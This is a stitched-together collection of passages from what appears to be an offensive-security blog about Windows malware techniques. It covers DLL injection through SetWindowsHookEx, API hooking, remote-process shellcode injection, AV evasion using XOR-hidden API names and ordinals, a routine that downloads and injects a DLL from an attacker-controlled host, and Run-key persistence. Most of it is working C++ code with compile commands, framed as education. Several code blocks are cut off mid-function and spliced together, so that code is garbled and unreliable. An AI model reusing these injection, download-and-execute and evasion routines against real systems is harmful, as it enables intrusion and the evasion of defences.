      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nIn this tutorial, I'll take a look at the DLL injection by using the `SetWindowsHookEx` method.    \n\n### SetWindowsHookEx\n\nLet's go to look an example which demonstrates this technique. The `SetWindowsHookEx` installs a hook routine into the hook chain, which is then invoked whenever certain events are triggered. Let's take a look at the function syntax:\n```cpp\nHHOOK SetWindowsHookExA(\n  [in] int       idHook,\n  [in] HOOKPROC  lpfn,\n  [in] HINSTANCE hmod,\n  [in] DWORD     dwThreadId\n);\n```\n\nThe most important param here is `idHook`. The type of hook to be installed, which can hold one of the following values:\n\n    WH_CALLWNDPROC\n    WH_CALLWNDPROCRET\n    WH_CBT\n    WH_DEBUG\n    WH_FOREGROUNDIDLE\n    WH_GETMESSAGE\n    WH_JOURNALPLAYBACK\n    WH_JOURNALRECORD\n    WH_KEYBOARD\n    WH_KEYBOARD_LL\n    WH_MOUSE\n    WH_MOUSE_LL\n    WH_MSGFILTER\n    WH_SHELL\n    WH_SYSMSGFILTER\n\nIn our case, I'll be hooking the `WH_KEYBOARD` type of event, which will allow us to monitor keystroke messages.\n\n### malicious DLL\n\nLet's go to prepare our malicious DLL. For simplicity, we create DLL which just pop-up a message box:\n```cpp\n/*\nevil.cpp\nsimple DLL for DLL inject to process\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/tutorial/2021/11/25/malware-injection-7.html\n*/\n\n#include \n#pragma comment (lib, \"user32.lib\")\n\nBOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {\n  switch (nReason) {\n  case DLL_PROCESS_ATTACH:\n    break;\n  case DLL_PROCESS_DETACH:\n    break;\n  case DLL_THREAD_ATTACH:\n    break;\n  case DLL_THREAD_DETACH:\n    break;\n  }\n  return TRUE;\n}\n\nextern \"C\" __declspec(dllexport) int Meow() {\n  MessageBox(\n    NULL,\n    \"Meow from evil.dll!\",\n    \"=^..^=\",\n    MB_OK\n  );\n  return 0;\n}\n\n```\n\nAs you can see we have a pretty simple DLL. The `DllMain()` function is called when the DLL is loaded into the process's address space. There's also a function named `Meow()`, which is an exported function and which is just pop-up message *\"Meow from evil.dll!\"*.   \n\n### example. simple malware.\n\nThe next thing that we need to do is create our malware. Let's go to look the source code:\n```cpp\n/*\nhack.cpp\nDLL inject via SetWindowsHookEx\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/tutorial/2021/11/25/malware-injection-7.html\n*/\n#include \n#include \n\ntypedef int (__cdecl *MeowProc)();\n\nint main(void) {\n  HINSTANCE meowDll;\n  MeowProc meowFunc;\n  // load evil DLL\n  meowDll = LoadLibrary(TEXT(\"evil.dll\"));\n\n  // get the address of exported function from evil DLL\n  meowFunc = (MeowProc) GetProcAddress(meowDll, \"Meow\");\n\n  // install the hook - using the WH_KEYBOARD action\n  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)meowFunc, meowDll, 0);\n  Sleep(5*1000);\n  UnhookWindowsHookEx(hook);\n\n  return 0;\n}\n```\n\nIt's also pretty simple. First of all we call `LoadLibrary` to load our malicious DLL:    \n\n    \n\nThen, we are calling the `GetProcAddress` to get the address of the exported function `Meow`:    \n\n    \n\nAfter that, the our malware calls the most important function, the `SetWindowsHookEx`. The parameters passed to that function determine what the function will actually do:   \n\n    \n\nAs you can see, whenever the keyboard event will occur, our function will be called. And we are passing the address of the our exported function - `meowFunc` parameter. Also we are passing the handle to our DLL - `meowDll` parameter. The last parameter `0` specifies that we want all programs to be hooked, not just a specific one, so it's a global hook.    \n\nThen we call `Sleep`:\n\n    \n\nfor demonstrate that our hook works.\n\nThen we call the `UnhookWindowsHookEx()` function to unhook the previously hooked `WH_KEYBOARD` action:\n\n    \n\nSo finally after we understood entire code of the malware, we can test it.    \nLet's go to compile malicious DLL firstly:\n```bash\nx86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive\n```\n\n    \n\ncompile malware code:\n```bash\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nThen, see everything in action! Start our `hack.exe` on the victim machine (Windows 7 x64):\n```cmd\n.\\hack.exe\n```\n\n    \n\nWe can see that everything was completed successfully and at this point whenever we start a program, pop-up our message only when keyboard key is pressed.   \n\n### Conclusion\n\nIn this article, I've demonstrate how we can use the `SetWindowsHookEx` function to inject the DLL into the process's address space and execute arbitrary code inside the process's address space.    \n\nThere is a caveat. This technique is not working in my Windows 10 x64 machine. I think the reason is this: CIG block this technique. Windows 10 x64 have two important things:\n\n- **CFG (Control Flow Guard)** - prevent indirect calls to non-approved\naddresses\n- **CIG (Code Integrity Guard)** - only allow modules signed by\nMicrosoft/Microsoft Store/WHQL to be loaded into the process memory.   \n\nIn [this](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf) presentation from BlackHat USA 2019, the authors explain that CIG block this technique.    \n\nLet's go to upload our `hack.exe` to virustotal:\n\n    \n\n[https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d917509250f87a121fa1cfeded41b7921](https://www.virustotal.com/gui/file/273e191999eb6a4bc010eeaf9c4e196d917509250f87a121fa1cfeded41b7921)    \n\n**So, 5 of 67 AV engines detect our file as malicious.**    \n\n[BlackHat USA 2019 process injection techniques Gotta Catch Them All](https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf)     \n[SetWindowsHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)    \n[Using Hooks MSDN](https://docs.microsoft.com/en-us/"

      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\n### what is API hooking?\n\nAPI hooking is a technique by which we can instrument and modify the behaviour and flow of API calls. We will need this bytes:\n\n    \n\nthen, create a `myFunc` function that will be executed when the original `Cat` is called:\n\n    \n\noverwrite `5` bytes with a jump to `myFunc`:\n\n    \n\nThen, create a \"patch\":    \n\n    \n\nin the next step, patch our `Cat` function (redirect `Cat` function to `myFunc`):    \n\n    \n\nSo what have we done here? This trick is *\"classic 5-byte hook\"* technique. If we disassemble function:\n\n    \n\nThe highlighted `5` bytes is a fairly typical prologue found in many API functions. By overwriting these first `5` bytes with a `jmp` instruction, we are redirecting execution to our own defined function. We will save the original bytes so that they can be referenced later when we want to pass execution back to the hooked function.    \n\nSo firstly, we call original `Cat` function, set our hook and call `Cat` again:\n\n    \n\nFull source code is:\n```cpp\n/*\nhooking.cpp\nbasic hooking example\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/tutorial/2021/11/30/basic-hooking-1.html\n*/\n#include \n\ntypedef int (__cdecl *CatProc)(LPCTSTR say);\n\n// buffer for saving original bytes\nchar originalBytes[5];\n\nFARPROC hookedAddress;\n\n// we will jump to after the hook has been installed\nint __stdcall myFunc(LPCTSTR say) {\n  HINSTANCE petDll;\n  CatProc catFunc;\n\n  // unhook the function: rewrite original bytes\n  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, originalBytes, 5, NULL);\n\n  // return to the original function and modify the text\n  petDll = LoadLibrary(\"pet.dll\");\n  catFunc = (CatProc) GetProcAddress(petDll, \"Cat\");\n\n  return (catFunc) (\"meow-squeak-tweet!!!\");\n}\n\n// hooking logic\nvoid setMySuperHook() {\n  HINSTANCE hLib;\n  VOID *myFuncAddress;\n  DWORD *rOffset;\n  DWORD src;\n  DWORD dst;\n  CHAR patch[5]= {0};\n\n  // get memory address of function Cat\n  hLib = LoadLibraryA(\"pet.dll\");\n  hookedAddress = GetProcAddress(hLib, \"Cat\");\n\n  // save the first 5 bytes into originalBytes (buffer)\n  ReadProcessMemory(GetCurrentProcess(), (LPCVOID) hookedAddress, originalBytes, 5, NULL);\n\n  // overwrite the first 5 bytes with a jump to myFunc\n  myFuncAddress = &myFunc;\n\n  // will jump from the next instruction (after our 5 byte jmp instruction)\n  src = (DWORD)hookedAddress + 5;\n  dst = (DWORD)myFuncAddress;\n  rOffset = (DWORD *)(dst-src);\n\n  // \\xE9 - jump instruction\n  memcpy(patch, \"\\xE9\", 1);\n  memcpy(patch + 1, &rOffset, 4);\n\n  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, patch, 5, NULL);\n\n}\n\nint main() {\n  HINSTANCE petDll;\n  CatProc catFunc;\n\n  petDll = LoadLibrary(\"pet.dll\");\n  catFunc = (CatProc) GetProcAddress(petDll, \"Cat\");\n\n  // call original Cat function\n  (catFunc)(\"meow-meow\");\n\n  // install hook\n  setMySuperHook();\n\n  // call Cat function after install hook\n  (catFunc)(\"meow-meow\");\n\n}\n\n```\n\nLet's go to compile this:\n```bash\nx86_64-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive\n```\n\n    \n\nAnd see it in action (on `Windows 7 x64` in this case):\n```cmd\n.\\hooking.exe\n```\n\n    \n\n    \n\nAs you can see our hook is worked perfectly!!       "title": "Code injection via ZwCreateSection. Simple C++ malware example.",
      "ref": "2022-01-14-malware-injection-13",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nIn the [previous post](/tutorial/2021/12/13/malware-injection-12.html) I wrote about code injection via memory sections.    \n\nThis post is a result of my own research on replacing some `Nt` prefixes with `Zw` prefixes.    \n\n### Zw prefix?    \n\nThe `Nt` prefix is an abbreviation of Windows NT, but the `Zw` prefix has no meaning.    \n\nFrom the [MSDN](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-nt-and-zw-versions-of-the-native-system-services-routines):    \n\n> When a user-mode application calls the Nt or Zw version of a native system services routine, the routine always treats the parameters that it receives as values that come from a user-mode source that is not trusted. The routine thoroughly validates the parameter values before it uses the parameters. In particular, the routine probes any caller-supplied buffers to verify that the buffers are located in valid user-mode memory and are aligned properly.    \n\n### practical example. C++ malware.    \nLet's go to replace some of the NT API functions from the previous post example with `Zw`-prefixed functions.    \n\nThe first thing that has to be done is to create a legit process with `CreateProcessA`:\n```cpp\nBOOL CreateProcessA(\n  [in, optional]      LPCSTR                lpApplicationName,\n  [in, out, optional] LPSTR                 lpCommandLine,\n  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,\n  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,\n  [in]                BOOL                  bInheritHandles,\n  [in]                DWORD                 dwCreationFlags,\n  [in, optional]      LPVOID                lpEnvironment,\n  [in, optional]      LPCSTR                lpCurrentDirectory,\n  [in]                LPSTARTUPINFOA        lpStartupInfo,\n  [out]               LPPROCESS_INFORMATION lpProcessInformation\n);\n```\n\n    \n\nNext steps are similar as [previous post](/tutorial/2021/12/13/malware-injection-12.html) but, the only difference is we use `ZwCreateThreadEx`:\n```cpp\ntypedef NTSTATUS(NTAPI* pZwCreateThreadEx)(\n  _Out_ PHANDLE                 ThreadHandle,\n  _In_ ACCESS_MASK              DesiredAccess,\n  _In_opt_ POBJECT_ATTRIBUTES   ObjectAttributes,\n  _In_ HANDLE                   ProcessHandle,\n  _In_ PVOID                    StartRoutine,\n  _In_opt_ PVOID                Argument,\n  _In_ ULONG                    CreateFlags,\n  _In_opt_ ULONG_PTR            ZeroBits,\n  _In_opt_ SIZE_T               StackSize,\n  _In_opt_ SIZE_T               MaximumStackSize,\n  _In_opt_ PVOID                AttributeList\n);\n```\n\n    \n\ninstead of `RtlCreateUserThread` for triggering payload.    \n\nAnd another difference is we used `ZwClose` for close handles (clean up):    \n\n```cpp\ntypedef NTSTATUS(NTAPI* pZwClose)(\n  _In_ HANDLE       Handle\n);\n```\n    \n\nSo, the full source code of our example malware is:    \n```cpp\n/*\n * hack.cpp - code injection via ZwCreateSection, ZwUnmapViewOfSection\n * @cocomelonc\n * https://cocomelonc.github.io/tutorial/2022/01/14/malware-injection-13.html\n*/\n#include \n#include \n#include \n\n#pragma comment(lib, \"ntdll\")\n\n// ZwCreateSection\ntypedef NTSTATUS(NTAPI* pZwCreateSection)(\n  OUT PHANDLE            SectionHandle,\n  IN ULONG               DesiredAccess,\n  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,\n  IN And `CreateRemoteThread` you can specify which process should start the new thread.    \n\nWhat about another way? it is possible to enumerate currently running target processes on the compromised system - search through their allocated memory blocks and check if any those are protected with RWX, so we can attempt to write/read/execute them, which may help to evasion some AV/EDR.     \n\n### sizeof(PROCESSENTRY32);\n\n  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n  if (INVALID_HANDLE_VALUE == hSnapshot) return -1;\n\n  hResult = Process32First(hSnapshot, &pe);\n\n  while m.BaseAddress);\n          WriteProcessMemory(ph, m.BaseAddress, my_payload, sizeof(my_payload), NULL);\n          CreateRemoteThread(ph, NULL, NULL, (LPTHREAD_START_ROUTINE)m.BaseAddress, NULL, NULL, NULL);\n          break;\n        }\n      }\n      address = 0;\n    }\n    hResult = Process32Next(hSnapshot, &pe);\n  }\n  CloseHandle(hSnapshot);\n  CloseHandle(ph);\n  return 0;\n}\n\n```\n\nAs RAM is considered volatile - meaning that it doesn't live long. Each time a computer is restarted, it flushes its memory from RAM, which means that, if a computer is hacked and then is restarted, you'll lose a lot of information that tells the story about how the system was compromised by attacker.    \n\n### volatility Framework\n\nVolatility is a tool that can be used to analyze the volatile memory of a system. Download and install from [here](https://github.com/volatilityfoundation/volatility3)        \n\n### practice example\n\nFirst of all, for simulating malware activity, create [classic](/tutorial/2021/09/18/malware-injection-1.html) process injection malware:    \n\n```cpp\n#include \n#include \n#include \n#include \n\n// meow-meow messagebox payload (without \"\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\"\n  \"\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\"\n  \"\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\"\n  \"\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\"\n \"\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\"\n  \"\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\"\n \"\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x1a\\x01\\x00\\x00\\x3e\"\n  \"\\x4c\\x8d\\x85\\x25\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\\x45\\x83\"\n int my_payload_len = sizeof(my_payload);\n\nint main(int argc, char* argv[]) {\n  HANDLE ph; // process handle\n  HANDLE rt; // remote thread\n  PVOID rb; // remote buffer\n\n  // parse process ID\n  printf(\"PID: %i\", atoi(argv[1]));\n  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\n\n  // allocate memory buffer for remote process\n  rb = VirtualAllocEx(ph, NULL, my_payload_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n\n  // \"copy\" data between processes\n  WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);\n\n  // our process start       "title": "Windows API hooking part 2. Simple C++ example.",
      "ref": "2022-03-08-basic-hooking-2",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\n### what is API hooking?\n\nAPI hooking is a technique by which we can instrument and modify the behaviour and flow of API calls. This technique is also used by many AV solutions to detect if code is malicious.   \n\nThe easiest way of hooking is by [inserting a jump instruction](/tutorial/2021/11/30/basic-hooking-1.html). In this post I will show you another technique.    \n\nThis method is six bytes in total, and looks like the following.    \n\nThe `push` instruction pushes a 32bit value on the stack, and the `retn` instruction pops a 32bit address off the stack into the Instruction Pointer (in other words, it starts execution at the address which is found at the top of the stack.)    \n\n### example 1\n\nLet's look at an example. In this case I can hook a function `WinExec` from `kernel32.dll` (`hooking.cpp`):    \n\n```cpp\n/*\nhooking.cpp\nbasic hooking example with push/retn method\nauthor: @cocomelonc\nhttps://cocomelonc.github.io/tutorial/2022/03/08/basic-hooking-2.html\n*/\n#include \n\n// buffer for saving original bytes\nchar originalBytes[6];\n\nFARPROC hookedAddress;\n\n// we will jump to after the hook has been installed\nint __stdcall myFunc(LPCSTR lpCmdLine, UINT uCmdShow) {\n  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, originalBytes, 6, NULL);\n  return WinExec(\"mspaint\", uCmdShow);\n}\n\n// hooking logic\nvoid setMySuperHook() {\n  HINSTANCE hLib;\n  VOID *myFuncAddress;\n  DWORD *rOffset;\n  DWORD *hookAddress;\n  DWORD src;\n  DWORD dst;\n  CHAR patch[6]= {0};\n\n  // get memory address of function WinExec\n  hLib = LoadLibraryA(\"kernel32.dll\");\n  hookedAddress = GetProcAddress(hLib, \"WinExec\");\n\n  // save the first 6 bytes into originalBytes (buffer)\n  ReadProcessMemory(GetCurrentProcess(), (LPCVOID) hookedAddress, originalBytes, 6, NULL);\n\n  // overwrite the first 6 bytes with a jump to myFunc\n  myFuncAddress = &myFunc;\n\n  // create a patch \"push , retn\"\n  memcpy_s(patch, 1, \"\\x68\", 1); // 0x68 opcode for push\n  memcpy_s(patch + 1, 4, &myFuncAddress, 4);\n  memcpy_s(patch + 5, 1, \"\\xC3\", 1); // opcode for retn\n\n  WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedAddress, patch, 6, NULL);\n}\n\nint main() {\n\n  // call original\n  WinExec(\"notepad\", SW_SHOWDEFAULT);\n\n  // install hook\n  setMySuperHook();\n\n  // call after install hook\n  WinExec(\"notepad\", SW_SHOWDEFAULT);\n\n}\n\n```\n\nAs you can see, the source code is identical to the example from the [first post](/tutorial/2021/11/30/basic-hooking-1.html) about hooking. The only difference is:\n\n    \n\nThat will translate into the following assembly instructions:\n\n```nasm\n// push myFunc memory address onto the stack\npush myFunc\n\n// jump to myFunc\nretn\n```\n\nLet's go to compile it:    \n\n```bash\ni686-w64-mingw32-g++ -O2 hooking.cpp -o hooking.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1\n```\n\n    \n\nAnd run on `Windows 7 x64`:    \n\n```cmd\n.\\hooking.exe\n```\n\n    \n\nAs you can see everything is worked perfectly :)\n\n[x86 API Hooking Demystified](http://jbremer.org/x86-api-hooking-demystified/)    \n[WinExec](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)    \n[source code in github](https://github.com/cocomelonc/meow/tree/master/2022-03-08-basic-hooking-2)    \n\n> This is a practical case for educational purposes only.      \n\nThanks for your time happy hacking and good bye!   \n*PS. All drawings and screenshots are mine*"

      "title": "AV engines evasion techniques - part 4. Simple C++ example.",
      "ref": "2022-03-18-simple-malware-av-evasion-4",
      "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis post is a result of my own research into another AV evasion trick. An example how to bypass AV engines in simple C++ malware.   \n\nThis trick regarding how you hide your windows API calls from static analysis.    \n\nWhen you want to interact with the windows operating system, then you need to call windows API for example from `user32.dll` from your code such as `MessageBoxA` or any other API. If you specify the calls from your code, then the compiler will include the `MessageBoxA` or all the API's needed in the import table in your PE. it would give ideas for the malware analyst for more closely investigate you malware.    \n\n### what is ordinals?   \n\nEach function exported by a DLL is identified by a numeric ordinal and optionally a name. Likewise, functions can be imported from a DLL either by ordinal or by name. The ordinal represents the position of the function’s address pointer in the DLL Export Address table.\n\nIn one of my [previous](/pentest/2021/10/12/dll-hijacking-2.html) posts I wrote a simple python script which enumerates the exported functions from the provided DLL (`dll-def.py`):    \n\n```python\nimport pefile\nimport sys\nimport os.path\n\ndll = pefile.PE(sys.argv[1])\ndll_basename = os.path.splitext(sys.argv[1])[0]\n\ntry:\n    with open(sys.argv[1].split(\"/\")[-1].replace(\".dll\", \".def\"), \"w\") as f:\n        f.write(\"EXPORTS\\n\")\n        for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:\n            if export.name:\n                f.write('{}={}.{} @{}\\n'.format(export.name.decode(), dll_basename, export.name.decode(), export.ordinal))\nexcept:\n    print (\"failed to create .def file :(\")\nelse:\n    print (\"successfully create .def file :)\")\n```\n\nLet's go to run it for `user32.dll`:\n\n```bash\npython3 dll-def.py user32.dll\n```\n\n    \n\n    \n\nAs you can see, for example, for `MessageBoxA` ordinal is `2039`, for `MessageBoxW` ordinal is `2046`.    \n\n### practical example.    \n\nLet's go to look at the practical example.    \n\nThe ordinals might change on each release of the dll. We do not hardcode it in our code. We need to look up the ordinals by iterating the list and make a string comparison. This activity is counterproductive to our objective to hide the API name in our code since we need to make a string comparison during the lookup.    \n\nThis technique is very simple.   \n\nFirst of all, I used a trick from my [previous](/tutorial/2021/09/06/simple-malware-av-evasion-2.html) post:    \n\n```cpp\n// encrypted function name (MessageBoxA)\nunsigned char s_mb[] = { 0x20, 0x1c, 0x0, 0x6, 0x11, 0x2, 0x17, 0x31, 0xa, 0x1b, 0x33 };\n\n// encrypted module name (user32.dll)\nunsigned char s_dll[] = { 0x18, 0xa, 0x16, 0x7, 0x43, 0x57, 0x5c, 0x17, 0x9, 0xf };\n\n// key\nchar s_key[] = \"mysupersecretkey\";\n\n// XOR decrypt\nvoid XOR(char * data, size_t data_len, char * key, size_t key_len) {\n  int j;\n  j = 0;\n  for (int i = 0; i e_lfanew);\n  if (IMAGE_NT_SIGNATURE != *sig) {\n    // Bad signature -- invalid image or module handle\n    return NULL;\n  }\n\n  // Get the COFF file header.\n  img_file_header = (PIMAGE_FILE_HEADER)(sig + 1);\n\n  // Get the \"optional\" header (it's not actually optional for executables).\n  img_opt_header = (PIMAGE_OPTIONAL_HEADER)(img_file_header + 1);\n\n  // Finally, get the export directory table.\n  if (IMAGE_DIRECTORY_ENTRY_EXPORT >= img_opt_header->NumberOfRvaAndSizes) {\n    // This image doesn't have an export directory table.\n    return NULL;\n  }\n  rva = img_opt_header->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n  edt = (PIMAGE_EXPORT_DIRECTORY)(base + rva);\n\n  return edt;\n}\n```\n\nAnd searches a module's name pointer table (NPT) for the named procedure:   \n\n```cpp\n// binary search\nDWORD findFuncB(PDWORD npt, DWORD size, PBYTE base, LPCSTR proc) {\n  INT   cmp;\n  DWORD max;\n  DWORD mid;\n  DWORD min;\n\n  min = 0;\n  max = size - 1;\n\n  while (min > 1;\n    cmp = strcmp((LPCSTR)(npt[mid] + base), proc);\n    // printf(\"check API name %s on %d\\n\", (LPCSTR)(npt[mid] + base), mid);\n\n    if (cmp  0) {\n      max = mid - 1;\n    } else {\n      return mid;\n    }\n  }\n  return -1;\n}\n```\n\nAs you can see, is simply a convenience function that does the binary search of the NPT.   \n\nFinally, get ordinal:    \n\n```cpp\n// get func ordinal\nDWORD getFuncOrd(HMODULE module, LPCSTR proc) {\n  PBYTE           base; // module base address\n  PIMAGE_EXPORT_DIRECTORY edt;  // export directory table (EDT)\n  PWORD           eot;  // export ordinal table (EOT)\n  DWORD           i;  // index into NPT and/or EOT\n  PDWORD          npt;  // name pointer table (NPT)\n\n  base = (PBYTE)module;\n\n  // Get the export directory table, from which we can find the name pointer\n  // table and export ordinal table.\n  edt = getEDT(module);\n\n  // Get the name pointer table and search it for the named procedure.\n  npt = (DWORD*)(base + edt->AddressOfNames);\n  i = findFuncB(npt, edt->NumberOfNames, base, proc);\n  if (-1 == i) {\n    // The procedure was not found in the module's name pointer table.\n    return -1;\n  }\n\n  // Get the export ordinal table.\n  eot = (WORD*)(base + edt->AddressOfNameOrdinals);\n\n  // Actual ordinal is ordinal from EOT plus \"ordinal base\" from EDT.\n  return eot[i] + edt->Base;\n}\n```\n\nAnd `main` function idea without error checking:    \n\n```cpp\nint main(int argc, char* argv[]) {\n  XOR((char *) s_dll, sizeof(s_dll), s_key, sizeof(s_key));\n  XOR((char *) s_mb, sizeof(s_mb), s_key, sizeof(s_key));\n  LoadLibrary((LPCSTR) s_dll)\n  HMODULE module = GetModuleHandle((LPCSTR) s_dll);\n  DWORD ord = getFuncOrd(module, (LPCSTR) s_mb);\n  fnMessageBoxA myMessageBoxA = (fnMessageBoxA)GetProcAddress(module, MAKEINTRESOURCE(ord));\n  myMessageBoxA(NULL, \"Meow-meow!\",\"=^..^=\", MB_OK);\n  return 0;\n}\n```\n\nSo the full source code of our example:    \n\n```cpp\n/*\n * hack.cpp - Find function from DLL via ordinal.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis post is the result of my own research into interesting trick in real-life malware.    \n\n### download and execute\n\n*Download and execute* or in our case *download and inject* is interesting trick and designed to download payload or evil DLL from a url, with an emphasis on  `http`, and execute or inject it. The benefits to the *download/execute* (or *download/inject*) approach are that it can be used behind networks that filter all other traffic aside from HTTP. It can even work through a pre-configured proxy given that said proxy does not require authentication information.    \n\n### practical example\n\nFirst of all, let's go to consider [classic DLL injection](/tutorial/2021/09/20/malware-injection-2.html) malware. In the simplest case it will look like this:    \n\n```cpp\n/*\n* classic DLL injection example\n* author: @cocomelonc\n*/\n#include \n#include \n#include \n#include \n#include \n\nchar evilDLL[] = \"C:\\\\evil.dll\";\nunsigned int evilLen = sizeof(evilDLL) + 1;\n\nint main(int argc, char* argv[]) {\n  HANDLE ph; // process handle\n  HANDLE rt; // remote thread\n  LPVOID rb; // remote buffer\n\n  HMODULE hKernel32 = GetModuleHandle(\"Kernel32\");\n  VOID *lb = GetProcAddress(hKernel32, \"LoadLibraryA\");\n\n  // parse process pid\n  if ( atoi(argv[1]) == 0) {\n    printf(\"PID not found :( exiting...\\n\");\n    return -1;\n  }\n  printf(\"PID: %i\", atoi(argv[1]));\n  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));\n  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);\n  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);\n  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);\n  CloseHandle(ph);\n  return 0;\n}\n```\n\nIt's pretty simple as you can see.    \nHere I want to add some simple logic for downloading our `evil.dll`. In the simplest case it will look like this:    \n\n```cpp\n// download evil.dll from url\nchar* getEvil() {\n  HINTERNET hSession = InternetOpen((LPCSTR)\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n  HINTERNET hHttpFile = InternetOpenUrl(hSession, (LPCSTR)\"http://192.168.56.1:4444/evil.dll\", 0, 0, 0, 0);\n  DWORD dwFileSize = 1024;\n  char* buffer = new char[dwFileSize + 1];\n  DWORD dwBytesRead;\n  DWORD dwBytesWritten;\n  HANDLE hFile = CreateFile(\"C:\\\\Temp\\\\evil.dll\", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n  do {\n    buffer = new char[dwFileSize + 1];\n    ZeroMemory(buffer, sizeof(buffer));\n    InternetReadFile(hHttpFile, (LPVOID)buffer, dwFileSize, &dwBytesRead);\n    WriteFile(hFile, &buffer[0], dwBytesRead, &dwBytesWritten, NULL);\n    delete[] buffer;\n    buffer = NULL;\n  } while (dwBytesRead);\n\n  CloseHandle(hFile);\n  InternetCloseHandle(hHttpFile);\n  InternetCloseHandle(hSession);\n  return buffer;\n}\n```\n\nThis function download `evil.dll` from attacker's machine (`192.168.56.1:4444`, but in the real-life scenario it can be looks like `evilmeowmeow.com:80`) and save to file `C:\\\\Temp\\\\evil.dll`.   \n\nThen, we run this code in the `main()` function.       "content": "﷽\n\nHello, cybersecurity enthusiasts and white hackers!\n\n    \n\nThis post starts a series of articles on windows malware persistence techniques and tricks.    \n\nToday I'll write about the result of my own research into the \"classic\" persistence trick: startup folder registry keys.    \n\n### run keys\n\nAdding an entry to the \"run keys\" in the registry will cause the app referenced to be executed when a user logs in. These apps will be executed under the context of the user and will have the account's associated permissions level.    \n\nThe following run keys are created by default on Windows Systems:    \n\n`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`    \n    \n\n`HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`    \n    \n\n`HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`    \n    \n\n> Please note that this suggests to another trick to anti-VM (VirtualBox)    \n\n`HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`    \n    \n\nThreat actors can use these configuration locations to execute malware to maintain persistence through system reboots. Threat actors may also use masquerading to make the registry entries look as if they are associated with legitimate programs.    \n\n### practical example\n\nLet's go to look at a practical example. We just add new registry key. Registry keys can be added from the terminal to the run keys to achieve persistence, but since I love to write code, I wanted to show how to do it with some lines of code.    \n\n### demo\n\nLet's compile our `pers.cpp` script:   \n\n```bash\nx86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions 